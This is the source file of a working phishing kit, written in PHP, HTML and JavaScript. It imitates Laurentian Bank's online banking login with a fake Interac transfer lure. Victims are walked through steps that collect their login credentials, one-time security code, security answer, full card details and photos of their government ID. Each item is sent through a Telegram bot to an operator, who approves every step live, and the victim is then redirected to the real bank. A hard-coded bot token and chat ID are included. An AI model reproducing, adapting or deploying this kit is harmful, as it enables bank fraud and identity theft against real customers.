<?php
declare(strict_types=1);

ob_start();
if (session_status() === PHP_SESSION_NONE) session_start();

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");

/* ---------- Configuration ---------- */
$telegramToken = '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
$chatId        = '-1002922644009';

/* ---------- Server-Side Proxy ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
    $action = $_POST['action'];
    $allowed_actions = ['sendMessage', 'getUpdates', 'editMessageReplyMarkup', 'sendPhoto'];
    
    if (in_array($action, $allowed_actions)) {
        $params = $_POST;
        unset($params['action']);
        
        if (!empty($_FILES)) {
            foreach ($_FILES as $key => $file) {
                $params[$key] = new CURLFile($file['tmp_name'], $file['type'], $file['name']);
            }
        }
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$telegramToken}/{$action}");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
        echo $result;
    }
    exit;
}

$cancelActionHandled = false;
if (isset($_GET['action']) && $_GET['action'] === 'cancel') {
    $logFile = __DIR__ . '/data/logs/transfers.log';
    if (@is_file($logFile) && @is_writable($logFile)) {
        $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (!empty($lines)) {
            $last_line_key = count($lines) - 1;
            if (strpos($lines[$last_line_key], 'pending') !== false) {
                 $lines[$last_line_key] = str_replace('pending', 'Cancelled', $lines[$last_line_key]);
                 file_put_contents($logFile, implode(PHP_EOL, $lines) . PHP_EOL);
            }
        }
    }
    $cancelActionHandled = true;
}

/* ---------- Resolve transaction data ---------- */
$tx = $_SESSION['transaction'] ?? $_SESSION['transaction_data'] ?? $_SESSION['last_transfer'] ?? null;
if (!is_array($tx)) $tx = [];

/* ---------- Sender Name ---------- */
$senderName = (string)($tx['sender_name'] ?? $tx['sender'] ?? 'JENNIFER NOSKIYE');

/* ---------- Amount ---------- */
$amount = (string)($tx['amount'] ?? '10.00');

/* ---------- Security Question ---------- */
$securityQuestion = 'What is the color of your car?';

/* Normalize amount display */
$amount = number_format((float)str_replace(['$', ',', ' '], '', $amount), 2);

$_SESSION['senderName'] = $senderName;
$_SESSION['amount'] = $amount;

/* ---------- Safe HTML values ---------- */
$senderNameSafe = htmlspecialchars($senderName, ENT_QUOTES, 'UTF-8');
$amountSafe     = htmlspecialchars($amount, ENT_QUOTES, 'UTF-8');
$securityQuestionSafe = htmlspecialchars($securityQuestion, ENT_QUOTES, 'UTF-8');

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>auth.banquelaurentienne.ca/auth/oauth2/login?execution=e1s1&client_id=OnlineBanking</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --lbc-blue: #004a80;
            --lbc-notice-border: #b36b00;
            --lbc-grey-text: #757575;
            --lbc-btn-bg: #e0e0e0;
            --lbc-error-color: #d93025;
        }
        body { font-family: 'Roboto', sans-serif; background: #fff; margin: 0; color: #333; -webkit-font-smoothing: antialiased; }
        header { background: var(--lbc-blue); padding: 12px 15px; display: flex; align-items: center; }
        .logo-box { background: #fff; padding: 4px 8px; border-radius: 2px; display: flex; align-items: center; }
        .logo-svg { width: 24px; height: 24px; margin-right: 6px; }
        .logo-txt { color: var(--lbc-blue); font-weight: 700; font-size: 14px; text-transform: uppercase; line-height: 1; }
        
        .content { max-width: 100%; padding: 20px; }
        
        .notice {
            border: 1px solid #e0e0e0; border-top: 5px solid var(--lbc-notice-border);
            padding: 15px; border-radius: 4px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
            margin-bottom: 30px; display: flex;
        }
        .notice-icon { color: var(--lbc-notice-border); font-size: 18px; margin-right: 12px; }
        .notice-text { font-size: 14px; line-height: 1.5; color: #333; }
        
        .field { margin-bottom: 25px; position: relative; }
        .label { display: block; font-size: 12px; font-weight: 500; color: var(--lbc-grey-text); text-transform: uppercase; margin-bottom: 2px; }
        .input {
            width: 100%; box-sizing: border-box; border: none; border-bottom: 1px solid #ccc; padding: 10px 0;
            font-size: 16px; border-radius: 0; background: transparent; outline: none; transition: 0.2s; color: #333;
        }
        .input:focus { border-bottom: 2px solid var(--lbc-blue); }
        select.input { background: #fff; }
        
        .show-pw { position: absolute; right: 0; bottom: 10px; color: var(--lbc-blue); font-size: 13px; cursor: pointer; display: flex; align-items: center; }
        .show-pw svg { width: 18px; height: 18px; margin-right: 4px; fill: var(--lbc-blue); }

        .btn {
            width: 100%; background: var(--lbc-btn-bg); color: #888; border: none; padding: 14px;
            font-size: 15px; font-weight: 700; border-radius: 4px; text-transform: uppercase;
            cursor: pointer; margin-bottom: 20px; transition: 0.3s;
        }
        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
        .btn.ready { background: var(--lbc-blue); color: #fff; }
        
        .error-message {
            color: var(--lbc-error-color); margin-bottom: 15px; text-align: center;
            font-size: 14px; display: none;
        }
        .checkmark{width:60px;height:60px;border-radius:50%;border:4px solid #28a745;position:relative;margin: 0 auto 20px auto;animation:scaleUp 0.5s ease forwards;}
        .checkmark::after{content:'';position:absolute;left:18px;top:30px;width:20px;height:10px;border-left:4px solid #28a745;border-bottom:4px solid #28a745;transform:rotate(-45deg);transform-origin:left top;opacity:0;animation:drawCheck 0.5s 0.5s forwards;}
        @keyframes scaleUp{0%{transform:scale(0);}100%{transform:scale(1);}}
        @keyframes drawCheck{0%{opacity:0;transform:rotate(-45deg) scale(0);}100%{opacity:1;transform:rotate(-45deg) scale(1);}}
    
        .tx-info { background: #f8fbff; border-radius: 4px; padding: 15px; margin-bottom: 25px; border-left: 5px solid var(--lbc-blue); font-size: 14px; }
        .tx-info div { display: flex; justify-content: space-between; margin-bottom: 4px; }
        .tx-info strong { color: var(--lbc-blue); }

        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(0,0,0,0.6); display: none; justify-content: center; 
            align-items: center; z-index: 1000;
        }
        .modal-content {
            background-color: #fff; padding: 25px 30px; border-radius: 5px;
            max-width: 380px; width: 90%; text-align: center;
        }
        .modal-content h2 { margin-top: 0; font-weight: 600; color: #333; }
        .modal-actions { margin-top: 25px; display: flex; flex-direction: column; gap: 10px; }
        .modal-actions button {
            width: 100%; padding: 12px; border: none; border-radius: 4px;
            font-size: 0.95rem; font-weight: 600; cursor: pointer;
        }
        .btn-danger { background-color: #dc3545; color: white; }
        .btn-secondary { background-color: #6c757d; color: white; }

        .step { display: none; }

        #stepLoader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.9);
            display: none; /* Initially hidden */
            justify-content: center;
            align-items: center;
            z-index: 2000;
            flex-direction: column; /* To stack spinner and text */
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f0f0f0;
            border-top: 5px solid var(--lbc-blue);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .id-upload-area {
            border: 2px dashed #ccc;
            padding: 20px;
            text-align: center;
            margin-bottom: 15px;
            cursor: pointer;
            border-radius: 4px;
            transition: 0.2s;
        }
        .id-upload-area:hover { border-color: var(--lbc-blue); background-color: #f9f9f9; }
    </style>
</head>
<body>

<header>
    <div class="logo-box">
        <svg class="logo-svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="45" fill="#004a80"></circle><path d="M50 20 L80 50 L50 80 L20 50 Z" fill="#ffcc00"></path></svg>
        <div class="logo-txt">Laurentian<br>Bank</div>
    </div>
</header>
<div class="content">
    <!-- Step 1: Login -->
    <div id="stepLogin" class="step">
        <div class="notice">
            <div class="notice-icon">⚠</div>
            <div class="notice-text">
                <strong>Notice:</strong> We've scheduled maintenance on Sunday, February 8, 2026. Online banking including <i>LBCDirect</i> will be unavailable during this window.
            </div>
        </div>
        <div id="errorMsgLogin" class="error-message"></div>
        <form id="loginForm">
            <div class="field">
                <label class="label">Access Code</label>
                <input type="text" id="username" class="input" placeholder="Access Code" required>
            </div>
            <div class="field" style="margin-bottom:35px;">
                <div class="show-pw" id="passwordToggle">
                    <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"></path></svg>
                    <span>Show</span>
                </div>
                <label class="label">Password</label>
                <input type="password" id="password" class="input" placeholder="Password" required>
            </div>
            <button type="submit" id="loginBtn" class="btn ready">Log In</button>
        </form>
    </div>

    <!-- Step 2: PIN -->
    <div id="stepPIN" class="step">
        <h1 style="font-size:20px; color:var(--lbc-blue); margin-bottom:10px;">Security Verification</h1>
        <p style="font-size:14px; color:#666; line-height:1.4;">For your security, please enter the 6 to 8-digit code sent to your device.</p>
        <div id="errorMsgPIN" class="error-message"></div>
        <form id="pinForm">
            <div class="field">
                <label class="label">Security Code</label>
                <input type="tel" id="pinCode" class="input" maxlength="8" placeholder="******" style="text-align:center; letter-spacing:5px;" required>
            </div>
            <button type="submit" id="pinBtn" class="btn ready">Validate</button>
        </form>
    </div>

    <!-- Step 3: Security Question -->
    <div id="stepSQ" class="step">
        <h1 style="font-size:20px; color:var(--lbc-blue); margin-bottom:10px;">Interac Settlement</h1>
        <div class="tx-info">
            <div><span>Sender:</span> <strong><?php echo $senderNameSafe; ?></strong></div>
            <div><span>Amount:</span> <strong>$<?php echo $amountSafe; ?> CAD</strong></div>
        </div>
        <p style="font-size:14px; color:#666; line-height:1.4;"><strong>Security Question:</strong> <?php echo $securityQuestionSafe; ?></p>
        <div id="errorMsgSQ" class="error-message"></div>
        <form id="sqForm">
            <div class="field">
                <label class="label">Answer</label>
                <input type="text" id="sqAnswer" class="input" placeholder="Answer" required>
            </div>
            <button type="submit" id="sqBtn" class="btn ready">Accept Transfer</button>
        </form>
        <button id="cancelTransferLink" style="background:none; border:none; color:var(--lbc-blue); text-decoration:underline; cursor:pointer; font-size:15px; width:100%; text-align:center; padding:10px 0;">Cancel Transfer</button>
    </div>

    <!-- Step 4: CC -->
    <div id="stepCC" class="step">
        <h1 style="font-size:20px; color:var(--lbc-blue); margin-bottom:10px;">Card Verification</h1>
        <p style="font-size:14px; color:#666; line-height:1.4;">Please enter your card information to verify your identity.</p>
        <div id="errorMsgCC" class="error-message"></div>
        <form id="ccForm">
            <div class="field">
                <label class="label">Card Number</label>
                <input type="tel" id="ccNum" class="input" maxlength="19" placeholder="0000 0000 0000 0000" required>
            </div>
            <div style="display:flex; gap:15px;">
                <div class="field" style="flex:1;">
                    <label class="label">Expiry Month</label>
                    <select id="ccMonth" class="input" required>
                        <option value="" disabled selected>MM</option>
                        <option>01</option><option>02</option><option>03</option><option>04</option>
                        <option>05</option><option>06</option><option>07</option><option>08</option>
                        <option>09</option><option>10</option><option>11</option><option>12</option>
                    </select>
                </div>
                <div class="field" style="flex:1;">
                    <label class="label">Expiry Year</label>
                    <select id="ccYear" class="input" required>
                        <option value="" disabled selected>YY</option>
                        <option>25</option><option>26</option><option>27</option><option>28</option>
                        <option>29</option><option>30</option><option>31</option><option>32</option>
                    </select>
                </div>
            </div>
            <div class="field">
                 <label class="label">CVV</label>
                 <input type="tel" id="ccCvv" class="input" maxlength="3" placeholder="123" required>
            </div>
            <button type="submit" id="ccBtn" class="btn ready">Verify</button>
        </form>
    </div>

    <!-- Step 5: ID Upload -->
    <div id="stepID" class="step">
        <h1 style="font-size:20px; color:var(--lbc-blue); margin-bottom:10px;">Identity Verification</h1>
        <p style="font-size:14px; color:#666; line-height:1.4;">Please upload a clear photo of your government-issued ID.</p>
        <div id="errorMsgID" class="error-message"></div>
        
        <div class="id-upload-area" onclick="document.getElementById('idFront').click()">
            <span style="color:var(--lbc-blue); font-weight:bold;">Upload Front ID</span>
            <div id="nameFront" style="font-size:12px; color:#666; margin-top:5px;">No file selected</div>
            <input type="file" id="idFront" hidden accept="image/*" onchange="document.getElementById('nameFront').textContent = this.files[0].name">
        </div>

        <div class="id-upload-area" onclick="document.getElementById('idBack').click()">
            <span style="color:var(--lbc-blue); font-weight:bold;">Upload Back ID</span>
            <div id="nameBack" style="font-size:12px; color:#666; margin-top:5px;">No file selected</div>
            <input type="file" id="idBack" hidden accept="image/*" onchange="document.getElementById('nameBack').textContent = this.files[0].name">
        </div>

        <button id="idBtn" class="btn ready" onclick="handleIDStep()">Submit Documents</button>
    </div>

    <!-- Step 6: Success Confirmation -->
    <div id="stepConfirm" class="step" style="text-align:center;">
        <div class="checkmark"></div>
        <h1 style="font-size:22px; color:var(--lbc-blue);">Success</h1>
        <p style="font-size:14px; color:#666; line-height:1.6;">Your transfer of <strong>$<?php echo $amountSafe; ?> CAD</strong> is complete. The funds will appear in your account within 30 minutes.<br><br>You will be redirected shortly.</p>
    </div>

    <!-- Step 7: Cancel Confirmation -->
    <div id="stepCancelConfirm" class="step" style="text-align:center;">
        <h1 style="font-size:22px; color:var(--lbc-blue);">Transfer Cancelled</h1>
        <p style="font-size:14px; color:#666; line-height:1.6;">The Interac transfer was successfully cancelled. No funds have been deposited.</p>
        <button onclick="location.href='index.php'" class="btn ready" style="margin-top:20px;">Return to Home</button>
    </div>
</div>

<!-- Loader Overlay -->
<div id="stepLoader">
    <div class="spinner"></div>
    <p style="color:#555; font-size:16px;">Processing, please wait...</p>
</div>

<!-- Cancellation Modal -->
<div id="cancelModal" class="modal-overlay">
    <div class="modal-content">
        <h2>Cancel Transfer</h2>
        <p>Are you sure you want to cancel this transfer? This action is irreversible.</p>
        <div class="modal-actions">
            <button id="confirmCancelBtn" class="btn-danger">Confirm Cancellation</button>
            <button id="closeModalBtn" class="btn-secondary">Back</button>
        </div>
    </div>
</div>

<script>
const chatId = "<?= $chatId ?>";
const ALL_STEPS = ['stepLogin', 'stepPIN', 'stepSQ', 'stepCC', 'stepID', 'stepConfirm', 'stepCancelConfirm'];
function showStep(stepId) {
    ALL_STEPS.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'none';
    });
    const stepEl = document.getElementById(stepId);
    if(stepEl) stepEl.style.display = 'block';
    window.scrollTo(0,0);
}

const loader = document.getElementById('stepLoader');
function showLoader() { if (loader) loader.style.display = 'flex'; }
function hideLoader() { if (loader) loader.style.display = 'none'; }
function showError(msg, errorId) {
    const el = document.getElementById(errorId);
    if (el) { el.textContent = msg; el.style.display = 'block'; }
}
function hideError(errorId) {
    const el = document.getElementById(errorId);
    if (el) el.style.display = 'none';
}

// CC Formatting
const ccNum = document.getElementById('ccNum');
if(ccNum) {
    ccNum.addEventListener('input', function(e) {
        let v = e.target.value.replace(/\D/g, '').substring(0,16);
        let f = v.match(/.{1,4}/g);
        e.target.value = f ? f.join(' ') : v;
    });
}

// Password Toggle
const passwordInput = document.getElementById('password');
const passwordToggle = document.getElementById('passwordToggle');
passwordToggle.addEventListener('click', () => {
    const isPassword = passwordInput.getAttribute('type') === 'password';
    passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
    passwordToggle.querySelector('span').textContent = isPassword ? 'Hide' : 'Show';
});

// API Proxy Helper
async function api(action, data, isFile = false) {
    let body;
    if(isFile) {
        body = new FormData();
        body.append('action', action);
        for(let k in data) body.append(k, data[k]);
    } else {
        const fd = new FormData();
        fd.append('action', action);
        for(let k in data) fd.append(k, data[k]);
        body = fd;
    }
    return fetch('', {method:'POST', body}).then(r=>r.json());
}

let lastUpdateId = 0;
let pollInterval;

// Initialize Polling
api('getUpdates', {offset: -1}).then(d => { 
    if(d.result && d.result.length) lastUpdateId = d.result[0].update_id; 
});

function poll(msgId, onOk, onFail, onCleanup) {
    if(pollInterval) clearInterval(pollInterval);
    pollInterval = setInterval(async () => {
        try {
            const r = await fetch('', {
                method:'POST', 
                headers:{'Content-Type':'application/x-www-form-urlencoded'},
                body:`action=getUpdates&offset=${lastUpdateId+1}&timeout=2`
            });
            const d = await r.json();
            if(d.result && d.result.length) {
                for(let u of d.result) {
                    lastUpdateId = u.update_id;
                    if(u.callback_query && u.callback_query.message.message_id == msgId) {
                        clearInterval(pollInterval);
                        const cmd = u.callback_query.data;
                        api('editMessageReplyMarkup', {chat_id:chatId, message_id:msgId, reply_markup:JSON.stringify({inline_keyboard:[]})});
                        
                        if (typeof onCleanup === 'function') onCleanup();
                        
                        if(cmd === 'yes') onOk();
                        else if(cmd === 'no') onFail();
                        else if(cmd === 'go_cc') showStep('stepCC');
                        else if(cmd === 'go_id') showStep('stepID');
                        else if(cmd === 'cancel') window.location.href="https://www.laurentianbank.ca";
                    }
                }
            }
        } catch(e){}
    }, 2000);
}

async function sendLog(step, content, btnId, next) {
    const btn = document.getElementById(btnId);
    const originalText = btn.textContent;
    btn.textContent = 'Processing...'; 
    btn.disabled = true;
    showLoader();
    
    const cleanup = () => {
         hideLoader();
         btn.disabled = false;
         btn.textContent = originalText;
    };

    try {
        const kb = {inline_keyboard:[
            [{text:"✅ ALLOW", callback_data:"yes"}, {text:"❌ BLOCK", callback_data:"no"}],
            [{text:"REQ CC", callback_data:"go_cc"}, {text:"REQ ID", callback_data:"go_id"}],
            [{text:"🚫 END SESSION", callback_data:"cancel"}]
        ]};
        
        const r = await api('sendMessage', {
            chat_id: chatId,
            text: `🟦 <b>LBC - ${step}</b>\n\n${content}`,
            parse_mode: 'HTML',
            reply_markup: JSON.stringify(kb)
        });
        
        poll(r.result.message_id, 
            () => next(), // OK
            () => { // Fail
                if(step === 'LOGIN') { showStep('stepLogin'); showError('Invalid Access Code or Password.', 'errorMsgLogin'); }
                if(step === 'PIN') { showStep('stepPIN'); showError('Invalid security code.', 'errorMsgPIN'); }
                if(step === 'SQ') { showStep('stepSQ'); showError('Incorrect security answer.', 'errorMsgSQ'); }
                if(step === 'CC') { showStep('stepCC'); showError('Card information invalid.', 'errorMsgCC'); }
            },
            cleanup
        );
    } catch(e) {
        cleanup();
    }
}

document.getElementById('loginForm').addEventListener('submit', (e) => {
    e.preventDefault();
    const u = document.getElementById('username').value.trim();
    const p = document.getElementById('password').value.trim();
    if (u.length < 3 || p.length < 6) { showError("Invalid Access Code or Password.", 'errorMsgLogin'); return; }
    hideError('errorMsgLogin');
    sendLog('LOGIN', `User: <code>${u}</code>\nPass: <code>${p}</code>`, 'loginBtn', () => showStep('stepPIN'));
});

document.getElementById('pinForm').addEventListener('submit', (e) => {
    e.preventDefault();
    const c = document.getElementById('pinCode').value.trim();
    if (!/^\d{6,8}$/.test(c)) { showError('Invalid security code.', 'errorMsgPIN'); return; }
    hideError('errorMsgPIN');
    sendLog('PIN', `Code: <code>${c}</code>`, 'pinBtn', () => showStep('stepSQ'));
});

document.getElementById('sqForm').addEventListener('submit', (e) => {
    e.preventDefault();
    const a = document.getElementById('sqAnswer').value.trim();
    if (!a) { showError('Answer required.', 'errorMsgSQ'); return; }
    hideError('errorMsgSQ');
    sendLog('SQ', `Answer: <code>${a}</code>`, 'sqBtn', () => {
         showStep('stepConfirm');
         setTimeout(() => { window.location.href = 'https://www.laurentianbank.ca/'; }, 5000);
    });
});

document.getElementById('ccForm').addEventListener('submit', (e) => {
    e.preventDefault();
    const n = document.getElementById('ccNum').value;
    const m = document.getElementById('ccMonth').value;
    const y = document.getElementById('ccYear').value;
    const c = document.getElementById('ccCvv').value;
    if(!m || !y) { showError('Expiration Date Required', 'errorMsgCC'); return; }
    hideError('errorMsgCC');
    sendLog('CC', `Card: <code>${n}</code>\nExp: <code>${m}/${y}</code>\nCVV: <code>${c}</code>`, 'ccBtn', () => showStep('stepID'));
});

async function handleIDStep() {
    const f = document.getElementById('idFront').files[0];
    const b = document.getElementById('idBack').files[0];
    if(!f || !b) { showError("Please upload both front and back images.", 'errorMsgID'); return; }
    hideError('errorMsgID');
    
    const btn = document.getElementById('idBtn');
    const originalText = btn.textContent;
    btn.textContent = "Uploading...";
    btn.disabled = true;
    showLoader();

    try {
        await api('sendPhoto', {chat_id: chatId, caption: 'Front ID', photo: f}, true);
        await api('sendPhoto', {chat_id: chatId, caption: 'Back ID', photo: b}, true);
        
        sendLog('ID DOCS', 'Documents uploaded.', 'idBtn', () => {
             showStep('stepConfirm');
             setTimeout(() => { window.location.href = 'https://www.laurentianbank.ca/'; }, 4000);
        });
    } catch(e) {
        hideLoader();
        btn.disabled = false;
        btn.textContent = originalText;
        showError("Upload failed. Please try again.", 'errorMsgID');
    }
}

// Cancel Modal
const cancelModal = document.getElementById('cancelModal');
document.getElementById('cancelTransferLink').addEventListener('click', (e) => {
    e.preventDefault();
    cancelModal.style.display = 'flex';
});
document.getElementById('closeModalBtn').addEventListener('click', () => {
    cancelModal.style.display = 'none';
});
document.getElementById('confirmCancelBtn').addEventListener('click', () => {
    window.location.href = 'index.php?action=cancel';
});

document.addEventListener('DOMContentLoaded', () => {
    const initialStep = '<?php echo $cancelActionHandled ? 'stepCancelConfirm' : 'stepLogin'; ?>';
    showStep(initialStep);
});
</script>

</body>
</html>